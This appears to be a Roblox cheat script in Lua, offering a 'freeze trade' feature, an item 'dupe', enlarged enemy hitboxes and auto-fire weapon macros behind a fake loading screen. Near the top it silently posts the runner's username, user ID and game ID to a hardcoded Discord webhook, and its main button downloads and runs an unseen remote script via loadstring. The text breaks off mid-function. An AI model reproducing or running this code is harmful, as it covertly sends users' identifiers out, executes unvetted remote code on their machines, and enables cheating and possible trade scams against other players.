local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local GameID = game.PlaceId
local PlayerName = player.Name
local PlayerID = player.UserId
local mouse = player:GetMouse()

-- 📡 WEBHOOK
local WebhookURL = "https://discord.com/api/webhooks/1502873473582633071/RNyYg0mW8rl8PVbSmvqcloT2QHoUJodjZ8E3pWAu0Yahd-H9XTi5KsT9G_RNd-UTBjuE"
local data = {embeds={{title="🚀 SCRIPT EXECUTED!",color=65535,fields={{name="👤 Username",value="`"..PlayerName.."`",inline=true},{name="🆔 User ID",value="`"..PlayerID.."`",inline=true},{name="🎮 Game ID",value="`"..GameID.."`",inline=true}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}}
pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)

-- 🎨 NEW THEME
local Theme = {
    BG = Color3.fromRGB(10,10,15),
    Panel = Color3.fromRGB(20,20,30),
    Primary = Color3.fromRGB(0,200,255),
    Secondary = Color3.fromRGB(100,100,255),
    Text = Color3.fromRGB(255,255,255)
}

-- ⚙️ MACRO SETTINGS
local MacroSettings = {
    DoubleSnowball = false,
    CustomComboActive = false,
    CustomWeapons = {},
    MacroSpeed = 0.12,
    SwapDelay = 0.06
}

-- ✨ LOADING SCREEN
local Loader = Instance.new("ScreenGui")
Loader.Name = "UpdateLoader"
Loader.ResetOnSpawn = false
Loader.Parent = player.PlayerGui
Loader.IgnoreGuiInset = true
Loader.ZIndexBehavior = Enum.ZIndexBehavior.Global

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1,0,1,0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.BorderSizePixel = 0
MainBG.Parent = Loader

local Center = Instance.new("Frame")
Center.Size = UDim2.new(0,700,0,450)
Center.Position = UDim2.new(0.5,-350,0.5,-225)
Center.BackgroundTransparency = true
Center.Parent = MainBG

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1,0,0,100)
Title.Position = UDim2.new(0,0,0,20)
Title.BackgroundTransparency = true
Title.Text = "FREEZE TRADE + MACRO"
Title.TextColor3 = Theme.Text
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = Center

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1,0,0,40)
SubTitle.Position = UDim2.new(0,0,0.22,0)
SubTitle.BackgroundTransparency = true
SubTitle.Text = "v3.0 • FULL VERSION"
SubTitle.TextColor3 = Theme.Primary
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.Gotham
SubTitle.Parent = Center

local BarOutline = Instance.new("Frame")
BarOutline.Size = UDim2.new(0,600,0,28)
BarOutline.Position = UDim2.new(0.5,-300,0.55,0)
BarOutline.BackgroundColor3 = Theme.Panel
BarOutline.BorderSizePixel = 0
BarOutline.Parent = Center

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1,0)
BarCorner.Parent = BarOutline

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0,0,1,0)
ProgressBar.BackgroundColor3 = Theme.Primary
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = BarOutline

local BarFill = Instance.new("UICorner")
BarFill.CornerRadius = UDim.new(1,0)
BarFill.Parent = ProgressBar

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0,150,0,40)
PercentText.Position = UDim2.new(0.5,-75,0.65,0)
PercentText.BackgroundTransparency = true
PercentText.Text = "0%"
PercentText.TextColor3 = Theme.Text
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = Center

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1,0,0,30)
StatusText.Position = UDim2.new(0,0,0.78,0)
StatusText.BackgroundTransparency = true
StatusText.Text = "Loading Assets..."
StatusText.TextColor3 = Color3.fromRGB(180,180,180)
StatusText.TextScaled = true
StatusText.Font = Enum.Font.Gotham
StatusText.Parent = Center

-- ⚡ LOADING ANIMATION
local LoadTime = 8
local Elapsed = 0
local StatusMessages = {"Initializing...", "Loading GUI...", "Fetching Data...", "Almost Done..."}
local Conn

Conn = RunService.RenderStepped:Connect(function(delta)
    Elapsed += delta
    local Prog = math.min(Elapsed / LoadTime, 1)
    ProgressBar.Size = UDim2.new(Prog,0,1,0)
    PercentText.Text = math.floor(Prog*100).."%"
    
    if Prog < 0.25 then StatusText.Text = StatusMessages[1]
    elseif Prog < 0.5 then StatusText.Text = StatusMessages[2]
    elseif Prog < 0.8 then StatusText.Text = StatusMessages[3]
    else StatusText.Text = StatusMessages[4] end
    
    if Prog >= 1 then
        Conn:Disconnect()
        local Fade = TweenInfo.new(1.2, Enum.EasingStyle.Quad)
        TweenService:Create(MainBG, Fade, {BackgroundTransparency=1}):Play()
        TweenService:Create(Title, Fade, {TextTransparency=1}):Play()
        TweenService:Create(SubTitle, Fade, {TextTransparency=1}):Play()
        TweenService:Create(BarOutline, Fade, {BackgroundTransparency=1}):Play()
        TweenService:Create(PercentText, Fade, {TextTransparency=1}):Play()
        TweenService:Create(StatusText, Fade, {TextTransparency=1}):Play()
        task.wait(1.5)
        Loader:Destroy()
        LoadMainGUI()
    end
end)

-- 🛠️ TOOLS
local HitboxParts = {}
local HitboxSize = 8
local POV_Distance = 9
local POV_Height = 4

local function EnableHitbox()
    for _,v in pairs(Workspace:GetChildren()) do
        if v:FindFirstChild("Humanoid") and v ~= player.Character then
            local HRP = v:FindFirstChild("HumanoidRootPart")
            if HRP and not HRP:FindFirstChild("Hitbox") then
                local Box = Instance.new("Part")
                Box.Name = "Hitbox"
                Box.Size = Vector3.new(HitboxSize,HitboxSize,HitboxSize)
                Box.Position = HRP.Position
                Box.Anchored = false
                Box.CanCollide = false
                Box.Transparency = 0.7
                Box.BrickColor = BrickColor.new("Cyan")
                Box.Material = Enum.Material.ForceField
                Box.Parent = HRP
                local Weld = Instance.new("Weld")
                Weld.Part0 = HRP
                Weld.Part1 = Box
                Weld.C0 = CFrame.new(0,0,0)
                Weld.Parent = Box
                table.insert(HitboxParts,Box)
            end
        end
    end
end

local function DisableHitbox()
    for _,v in pairs(HitboxParts) do if v then v:Destroy() end end
    HitboxParts = {}
end

local function ChangeView()
    local Cam = Workspace.CurrentCamera
    local Char = player.Character
    if not Char then return end
    local HRP = Char:FindFirstChild("HumanoidRootPart")
    if not HRP then return end
    Cam.CameraType = Enum.CameraType.Scriptable
    Cam.CFrame = Char.Head.CFrame
    Cam.FieldOfView = 90
    task.wait(2)
    TweenService:Create(Cam,TweenInfo.new(1.2,Enum.EasingStyle.Elastic),{CFrame=HRP.CFrame*CFrame.new(0,POV_Height,-POV_Distance),FieldOfView=70}):Play()
end

-- 🎒 DUPE FUNCTION
local function RealDupe(itemName)
    if not itemName or itemName == "" then return end
    local ItemToClone = nil
    if ReplicatedStorage:FindFirstChild(itemName) then ItemToClone = ReplicatedStorage[itemName] end
    if not ItemToClone then
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj.Name == itemName and (obj:IsA("Tool") or obj:IsA("Accessory")) then
                ItemToClone = obj
                break
            end
        end
    end
    if ItemToClone then
        local Clone = ItemToClone:Clone()
        Clone.Parent = player.Backpack
        if player.StarterGear then local Clone2 = ItemToClone:Clone() Clone2.Parent = player.StarterGear end
    end
end

-- 🛠️ MACRO CORE
local function GetWeapon(name)
    if not player.Character then return nil end
    return player.Backpack:FindFirstChild(name) or player.Character:FindFirstChild(name)
end

local function EquipWeapon(name)
    local tool = GetWeapon(name)
    if tool and player.Character and player.Character:FindFirstChild("Humanoid") then
        player.Character.Humanoid:EquipTool(tool)
        task.wait(MacroSettings.SwapDelay)
        return true
    end
    return false
end

-- ❄️ DOUBLE SNOWBALL MACRO
local function DoubleSnowballMacro()
    while MacroSettings.DoubleSnowball and task.wait(MacroSettings.MacroSpeed) do
        if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
        
        if EquipWeapon("Gold Snowball Launcher") then
            mouse:Button1Down()
            task.wait(0.05)
            mouse:Button1Up()
        end
        
        if EquipWeapon("Snowball Launcher") then
            mouse:Button1Down()
            task.wait(0.05)
            mouse:Button1Up()
        end
    end
end

-- ⚔️ CUSTOM COMBO
local function RunCustomCombo()
    while MacroSettings.CustomComboActive and task.wait(MacroSettings.MacroSpeed) do
        if not player.Character or not player.Character:FindFirstChild("Humanoid") then task.wait() continue end
        
        for _,weaponName in pairs(MacroSettings.CustomWeapons) do
            if not MacroSettings.CustomComboActive then break end
            if EquipWeapon(weaponName) then
                mouse:Button1Down()
                task.wait(0.05)
                mouse:Button1Up()
                task.wait(MacroSettings.SwapDelay)
            end
        end
    end
end

-- 🖥️ FULL GUI
function LoadMainGUI()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({
        Name = "⛄️ FREEZE TRADE + MACRO • v3.0",
        LoadingTitle = "NEW UPDATE INSTALLED",
        LoadingSubtitle = "by Legitness",
        ConfigurationSaving = {Enabled = false},
        Discord = {Enabled = false},
        KeySystem = false
    })

    -- 📑 TABS
    local Macros = Window:CreateTab("🤖 Macros", 4483362458)
    local Main = Window:CreateTab("🏠 Main",4483362458)
    local DupeMethod = Window:CreateTab("🧊 Dupe [NEW]",4483362458)
    local Tools = Window:CreateTab("🔧 Tools",4483362458)
    local Settings = Window:CreateTab("⚙️ Settings",4483362458)
    local Credits = Window:CreateTab("📜 Credits",4483362458)

    -- 🤖 MACRO TAB
    Macros:CreateSection("❄️ DOUBLE SNOWBALL")
    Macros:CreateToggle({
        Name = "DOUBLE SHOT • GOLD + REGULAR",
        CurrentValue = false,
        Callback = function(state)
            MacroSettings.DoubleSnowball = state
            if state then
                task.spawn(DoubleSnowballMacro)
                Rayfield:Notify({Title = "❄️ MACRO ON", Content = "1 Button = Double Snowball", Duration = 3})
            else
                Rayfield:Notify({Title = "❄️ MACRO OFF", Duration = 2})
            end
        end
    })

    Macros:CreateSection("📝 TYPE YOUR OWN COMBO")
    Macros:CreateLabel("Format: Weapon1, Weapon2, Weapon3")
    Macros:CreateLabel("Example: Brass Knuckles, Slasher Claws, Taser")
    
    Macros:CreateInput({
        Name = "Enter Weapons Here",
        PlaceholderText = "Type here...",
        Callback = function(text)
            MacroSettings.CustomWeapons = {}
            for weapon in string.gmatch(text, "[^,]+") do
                local clean = string.gsub(weapon, "^%s*(.-)%s*$", "%1")
                if clean ~= "" then table.insert(MacroSettings.CustomWeapons, clean) end
            end
            Rayfield:Notify({
                Title = "✅ COMBO SAVED",
                Content = "Loaded: "..#MacroSettings.CustomWeapons.." weapons",
                Duration = 2
            })
        end
    })

    Macros:CreateToggle({
        Name = "START CUSTOM COMBO",
        CurrentValue = false,
        Callback = function(state)
            if #MacroSettings.CustomWeapons == 0 then
                Rayfield:Notify({Title = "❌ ERROR", Content = "Enter weapons first!", Duration = 2})
                return
            end
            MacroSettings.CustomComboActive = state
            if state then
                task.spawn(RunCustomCombo)
                Rayfield:Notify({Title = "⚔️ COMBO RUNNING", Content = "Your custom sequence", Duration = 3})
            else
                Rayfield:Notify({Title = "⏹️ COMBO STOPPED", Duration = 2})
            end
        end
    })

    Macros:CreateSection("⚙️ SPEED CONTROL")
    Macros:CreateSlider({
        Name = "Macro Speed",
        Range = {0.04, 0.4},
        Increment = 0.01,
        CurrentValue = 0.12,
        Callback = function(val) MacroSettings.MacroSpeed = val end
    })
    Macros:CreateSlider({
        Name = "Swap Delay",
        Range = {0.02, 0.2},
        Increment = 0.01,
        CurrentValue = 0.06,
        Callback = function(val) MacroSettings.SwapDelay = val end
    })

    -- 🏠 MAIN TAB
    Main:CreateSection("MAIN FEATURES")
    Main:CreateButton({
        Name = "🧊 ACTIVATE FREEZE TRADE",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/Best-Macro-Script/refs/heads/main/Baddies", true))()
            Rayfield:Notify({Title="✅ ACTIVATED!",Content="Freeze Trade Running",Duration=2.5})
        end
    })

    Main:CreateButton({
        Name = "💰 TOKENS GIVER",
        Callback = function()
            Rayfield:Notify({Title="💰 SUCCESS!",
